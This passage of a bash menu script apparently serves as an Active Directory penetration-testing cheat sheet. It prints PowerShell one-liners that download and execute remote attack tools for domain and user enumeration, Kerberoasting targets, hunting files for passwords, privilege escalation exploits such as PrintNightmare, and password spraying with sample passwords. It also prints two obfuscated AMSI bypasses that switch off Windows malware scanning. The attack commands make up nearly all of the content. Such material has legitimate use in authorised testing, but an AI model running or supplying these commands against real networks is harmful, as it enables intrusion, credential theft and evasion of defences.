echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO -ADSpath ((Get-NetOU '<OU-Name>' -FullData).gplink.split(';')[0] -replace '^.')"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

      
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Recon_Domain_Groups() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Groups${RESTORE}"
echo -e ""
echo -e "${IBLUE}List all Groups${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup"
echo -e ""
echo -e "${IBLUE}List all Groups with partial wilcard${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup "\"*admin*"\""
echo -e ""
echo -e "${IBLUE}Identify interesting groups on a Domain Controller${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetDomainController | Get-NetLocalGroup -Recurse"
echo -e ""
echo -e "${IBLUE}List Groups of which a user is a member of${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetLocalGroup -Username '<Username>'"
echo -e ""
echo -e "${IBLUE}Get all the effective members of a group${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainGroupMember -Identity "\"Domain Admins"\" -Recurse | Select MemberName,GroupName,MemberObjectClass | Sort Name"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

     
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Policies() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Policies${RESTORE}"
echo -e "" 
echo -e "${IBLUE}Password Policy${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);(Get-DomainPolicy).'SystemAccess'"
echo -e ""
echo -e "${IBLUE}Kerberos Policy${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);(Get-DomainPolicy).'KerberosPolicy'"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Trusts() {

	clear
 
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Trusts${RESTORE}"
echo -e "" 
echo -e "${IBLUE}Get all Domains in Forest then list each Domain trust${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain -Verbose | Get-NetDomainTrust"
echo -e ""
echo -e "${IBLUE}Map all reachable Domain trusts${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrusts"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrusts -LDAP"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrust | Select SourceDomain,TargetDomain,TrustType,TrustDirection"
echo -e ""
echo -e "${IBLUE}List external trusts${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq 'External'}"
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetDomainTrust"
echo -e ""
echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-ForeignUser"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

     
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_Domain_Users(){

	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Domain Users${RESTORE}"
echo -e ""
echo -e "${IBLUE}Get User Properties${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,SamAccountName,Description | Sort Name"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties SamAccountName,Description | Sort SamAccountName"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,Description,pwdlastset,badpwdcount | Sort Name"
echo -e ""
echo -e "${IBLUE}Get Specific user account${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Username '<Username>'"
echo -e ""
echo -e "${IBLUE}Search for string in User Description field${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-UserField -SearchField Description -SearchTerm 'built'"
echo -e ""
echo -e "${IBLUE}Get all users with passwords changed more than 3 years ago${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);\$Date = (Get-Date).AddYears(-3).ToFileTime(); Get-DomainUser -LDAPFilter ""\"(pwdlastset<=\$Date)"\"" -Properties samaccountname,pwdlastset"
echo -e ""
echo -e "${IBLUE}Get all users with SPN set${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountName"
echo -e ""
echo -e "${IBLUE}Get all service accounts in "\"Domain Admins"\"${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | ?{\$_.memberof -match 'Domain Admins'} | Select SamAccountName | Sort SamAccountName"
echo -e ""
echo -e "${IBLUE}Get users with SID History set${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -LDAPFilter '(sidHistory=*)'"
echo -e ""
echo -e "${IBLUE}Kerberoastable users${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -SPN | Select name,ServicePrincipalName | Sort Name"
echo -e ""
echo -e "${IBLUE}AS-REP Roastable users${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-DomainUser -PreauthNotRequired | Select Name | Sort Name"
echo -e ""
echo -e ""

echo -ne  "Return to Domain Recon Menu?

      
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	1) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Recon_Domain_Tools(){


	clear
	
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Tools${RESTORE}"
echo -e ""
echo -e "${IBLUE}adPEAS${RESTORE}"
echo -e "$DownloadMethod "$adPEASRepo"adPEAS.ps1);Invoke-adPEAS"
echo -e "$DownloadMethod "$adPEASRepo"adPEAS-Light.ps1);Invoke-adPEAS"
echo -e ""
echo -e ""
echo -e "${IBLUE}BloodHound${RESTORE}"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

      
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) Internal_Menu_Recon_Domain ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac


}


Internal_Menu_Recon_Network(){

   	 clear

echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Network Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-ARPScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-ARPScan.ps1);Invoke-ARPScan -CIDR '<CIDR>'"
echo -e ""
echo -e "${IBLUE}Invoke-PortScan${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR> or <IP>' -TopPorts 1000 -oA -GrepOut Scan.txt"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P 135,445 -Open -oA SMB.txt"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P 1433 -Open -oA MSSQL.txt"
echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P 80,443,8080 -Open -oA Web.txt"
echo -e ""
echo -e "${IBLUE}BloodHound${RESTORE}"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

      
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) Internal_Menu_Recon ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Internal_Menu_Recon_File_Share() {

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}File and Share Enumeration${RESTORE}"
echo -e ""
echo -e "${IBLUE}Share Enumeration${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -verbose"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -CheckAccess"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Sharpshares.ps1);Invoke-SharpShares -Command "\"--shares"\""
echo -e ""
echo -e "${IBLUE}File Enumeration${RESTORE}"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -verbose"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -OfficeDocs"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -Include *.ps1,*.bak,*.vbs,*.config,*.conf"
echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -Terms account*,pass*,secret*,conf*,test*,salar*"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

       
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q)	Internal_Menu_Recon ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}

Internal_Menu_Privilege_Escalation() {

    clear

echo -e ""
echo -e ""
echo -e ""
echo -ne " Select Privilege Escalation Type



        1)  ->  [ Checks 	]
        2)  ->  [ Exploits 	]
                       
        Q)  ->	[Previous Menu	]
"
        read a
        case $a in
	        1) 	Internal_Menu_Privilege_Escalation_Checks ;;
	        2) 	Internal_Menu_Privilege_Escalation_Exploits ;;
	        q|Q)	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

Internal_Menu_Privilege_Escalation_Checks(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Privilege Escalation (Checks)${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-WinPEAS${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-winPEAS.ps1);Invoke-WinPEAS"
echo -e ""
echo -e "${IBLUE}PowerUp${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Invoke-AllChecks"
echo -e ""
echo -e "${IBLUE}Get-GPPPassword${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPassword"
echo -e ""
echo -e "${IBLUE}Grouper2${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Grouper2.ps1);Invoke-Grouper2 -Command "\"-g -f Grouper2-Report.html"\""
echo -e ""
echo -e "${IBLUE}Sherlock${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Sherlock.ps1);Find-AllVulns"
echo -e ""
echo -e "${IBLUE}PrivescCheck${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/PrivescCheck.ps1);Invoke-PrivescCheck"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Privilege_Escalation ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}

Internal_Menu_Privilege_Escalation_Exploits(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Privilege Escalation (Exploits)${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-Printnightmare${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-Nightmare"
echo -e ""
echo -e "${IBLUE}Get-System${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
echo -e ""
echo -e ""   

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Privilege_Escalation ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
          
}


Internal_Menu_MiTM_Attacks(){

echo "test"



}

Internal_Menu_Password_Spraying(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}Password Spraying${RESTORE}"
echo -e ""
echo -e "${IBLUE}Invoke-SprayEmptyPassword${RESTORE}"
echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword"
echo -e "$DownloadMethod "$S3cur3Th1sSh1tCredsRepo"/PowershellScripts/Invoke-SprayEmptyPassword.ps1);Invoke-SprayEmptyPassword -Domain Security.local -OutFile EmptyPasswordUsers.txt"
echo -e ""
echo -e "${IBLUE}Domain Password Spray${RESTORE}"
echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray"
echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray -Password Winter2022"
echo -e "$DownloadMethod "$DomainPasswordSprayRepo"DomainPasswordSpray.ps1);Invoke-DomainPasswordSpray -UsernameAsPassword -OutFile valid-creds.txt"
echo -e ""
echo -e "${IBLUE}Rubeus${RESTORE}"
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /password:Password123 /noticket /nowrap"\""
echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"spray /passwords:PasswordList.txt /noticket /nowrap"\""
echo -e ""
echo -e "${IBLUE}SharpSpray${RESTORE}"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray"
echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSpray --Passwords Password1,PAsSW0rd,Qwerty123"
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
        
}

Internal_Menu_AMSI_Bypasses(){

    clear
    
echo -e ""
echo -e ""
echo -e ""
echo -e "${LGREEN}AMSI Bypasses${RESTORE}"
echo -e ""
echo -e "${IBLUE}Bypass #1${RESTORE}"
echo -ne '
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref]."A`ss`Embly"."GET`TY`Pe"([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'\'NonPublic,Static\'').
SetValue($null,$true)
'
echo -e ""
echo -e "${IBLUE}Bypass #2${RESTORE}"
echo -ne '
$A="5492868772801748688168747280728187173688878280688776"
$B="8281173680867656877679866880867644817687416876797271"
function C($n, $m){
[string]($n..$m|%{[char][int](29+($A+$B).
    substring(($_*2),2))})-replace " "}
$k=C 0 37; $r=C 38 51
$a=[Ref].Assembly.GetType($k)
$a.GetField($r,'\'NonPublic,Static\'').SetValue($null,$true)
'
echo -e ""
echo -e ""

echo -ne  "Return to Previous Menu?

    
        Q)  ->	[Previous Menu		    ]
"

        read a
        case $a in
        	q|Q) 	Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac

}


Main_Menu(){

    clear

echo -ne "
            Main Menu

        1) -> Internal
        2) -> External (WIP)
"
        read a
        case $a in
	        1) Internal_Menu_Main ;;
		0) exit 0 ;;
		*) echo -e "Wrong option."
        esac
}

# Call the menu function
Main_Menu
